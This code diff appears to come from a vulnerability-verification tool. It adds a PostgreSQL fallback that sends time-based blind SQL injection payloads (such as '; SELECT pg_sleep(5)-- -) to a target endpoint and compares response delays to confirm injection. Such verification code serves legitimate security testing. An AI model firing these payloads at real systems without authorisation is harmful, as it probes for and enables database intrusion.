@@ -5721,6 +5721,47 @@ def verify_generic_sqli_blind(
                         pass
                 if res.verified:
                     break
+        # PostgreSQL fallback for generic SQLi: try pg_sleep when all SLEEP-based techniques fail
+        if not res.verified and sqli_param:
+            _all_responses_text = " ".join(str(t.get("body", "") or "") for t in tried[:5])
+            _pg_sigs = ("postgresql", "pg_catalog", "psql", "psycopg", "pgsql",
+                        "org.postgresql", "asyncpg", "sqlalchemy")
+            _is_pg = any(s.lower() in _all_responses_text.lower() for s in _pg_sigs)
+            if _is_pg:
+                step("generic SQLi: PostgreSQL signals detected — trying pg_sleep payloads")
+                _pg_pairs = [
+                    ("'; SELECT pg_sleep(5)-- -", "'; SELECT pg_sleep(0)-- -"),
+                    ("' OR (SELECT pg_sleep(5))::text='1", "' OR (SELECT pg_sleep(0))::text='1"),
+                    ("1; SELECT pg_sleep(5)-- -", "1; SELECT pg_sleep(0)-- -"),
+                ]
+                for _pgs, _pgf in _pg_pairs:
+                    try:
+                        _pgbp = dict(base_params); _pgbp[sqli_param] = _pgf
+                        _tf0 = time.time()
+                        _http_request(m, base_url + endpoint_path, timeout=12,
+                                      params=_pgbp if m == "GET" else None,
+                                      data=_pgbp if m != "GET" else None,
+                                      headers=custom_headers or None)
+                        _pgf_t = time.time() - _tf0
+                        _pgbs = dict(base_params); _pgbs[sqli_param] = _pgs
+                        _ts0 = time.time()
+                        _http_request(m, base_url + endpoint_path, timeout=15,
+                                      params=_pgbs if m == "GET" else None,
+                                      data=_pgbs if m != "GET" else None,
+                                      headers=custom_headers or None)
+                        _pgs_t = time.time() - _ts0
+                        if (_pgs_t - _pgf_t) >= 3.5:
+                            res.verified = True
+                            res.ok = True
+                            res.confidence = "probable"
+                            res.evidence["tecnica"] = "postgres-time-based-generic"
+                            res.evidence["pg_slow_s"] = round(_pgs_t, 2)
+                            res.evidence["pg_fast_s"] = round(_pgf_t, 2)
+                            res.detail = f"PostgreSQL time-based blind SQLi (generic): pg_sleep delay {_pgs_t:.1f}s vs {_pgf_t:.1f}s"
+                            step(f"GENERIC SQLi POSTGRES confirmado: delay {_pgs_t:.1f}s")
+                            break
+                    except Exception:
+                        pass
         if not res.verified:
             _capture_container_logs_on_failure(container, res, step)
         return res
